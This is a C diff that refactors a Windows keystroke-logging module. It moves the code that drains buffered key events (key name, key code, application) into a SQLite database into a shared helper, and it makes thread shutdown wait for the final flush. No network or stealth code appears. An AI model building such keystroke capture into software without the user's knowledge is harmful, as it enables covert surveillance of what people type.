@@ -21,21 +21,30 @@ static HANDLE g_klogSignal = NULL;
 static HANDLE g_klogThread = NULL;
 static volatile BOOL g_klogRunning = FALSE;
 
+static void keylog_drain_events_locked(void)
+{
+    if (g_klogCount > 0 && g_klogDb) {
+        sqlite3_exec(g_klogDb, "BEGIN IMMEDIATE", NULL, NULL, NULL);
+        while (g_klogCount > 0) {
+            const KlogEvent *e = &g_klogBuf[g_klogRead];
+            keylog_insert(e->key_name, e->vk_code, e->app);
+            g_klogRead = (g_klogRead + 1) % KLOG_BUF_SIZE;
+            g_klogCount--;
+        }
+        sqlite3_exec(g_klogDb, "COMMIT", NULL, NULL, NULL);
+    }
+}
+
 static DWORD WINAPI klog_writer_thread(LPVOID param)
 {
     (void)param;
-    while (g_klogRunning) {
+    for (;;) {
         WaitForSingleObject(g_klogSignal, 100);
         EnterCriticalSection(&g_klogCs);
-        if (g_klogCount > 0 && g_klogDb) {
-            sqlite3_exec(g_klogDb, "BEGIN IMMEDIATE", NULL, NULL, NULL);
-            while (g_klogCount > 0) {
-                const KlogEvent *e = &g_klogBuf[g_klogRead];
-                keylog_insert(e->key_name, e->vk_code, e->app);
-                g_klogRead = (g_klogRead + 1) % KLOG_BUF_SIZE;
-                g_klogCount--;
-            }
-            sqlite3_exec(g_klogDb, "COMMIT", NULL, NULL, NULL);
+        keylog_drain_events_locked();
+        if (!g_klogRunning && g_klogCount == 0) {
+            LeaveCriticalSection(&g_klogCs);
+            break;
         }
         LeaveCriticalSection(&g_klogCs);
     }
@@ -101,10 +110,7 @@ void keylog_close(void)
         g_klogRunning = FALSE;
         SetEvent(g_klogSignal);
         if (g_klogThread) {
-            DWORD wr = WaitForSingleObject(g_klogThread, 5000);
-            if (wr == WAIT_TIMEOUT) {
-                TerminateThread(g_klogThread, 0);
-            }
+            WaitForSingleObject(g_klogThread, INFINITE);
             CloseHandle(g_klogThread);
             g_klogThread = NULL;
         }
@@ -285,15 +291,6 @@ void keylog_flush_events(void)
 {
     if (!g_klogSignal) return;
     EnterCriticalSection(&g_klogCs);
-    if (g_klogCount > 0 && g_klogDb) {
-        sqlite3_exec(g_klogDb, "BEGIN IMMEDIATE", NULL, NULL, NULL);
-        while (g_klogCount > 0) {
-            const KlogEvent *e = &g_klogBuf[g_klogRead];
-            keylog_insert(e->key_name, e->vk_code, e->app);
-            g_klogRead = (g_klogRead + 1) % KLOG_BUF_SIZE;
-            g_klogCount--;
-        }
-        sqlite3_exec(g_klogDb, "COMMIT", NULL, NULL, NULL);
-    }
+    keylog_drain_events_locked();
     LeaveCriticalSection(&g_klogCs);
 }
